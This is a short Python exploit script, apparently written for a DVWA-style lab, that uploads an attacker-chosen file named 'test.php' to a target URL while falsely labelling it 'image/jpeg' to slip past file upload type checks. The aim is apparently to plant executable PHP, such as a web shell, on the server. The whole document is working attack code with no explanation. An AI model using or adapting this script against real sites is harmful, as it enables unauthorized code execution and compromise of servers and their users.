import sys
import requests

PARAMS = {
	'page': 'upload'
}
DATA = {
	'Upload': 'Upload'
}


if __name__ == '__main__':
	BASE_URL = sys.argv[1]
	FILE = [('uploaded', ('test.php', open(sys.argv[2], 'rb'), 'image/jpeg'))]
	print(requests.post(BASE_URL, data=DATA, files=FILE, params=PARAMS).text)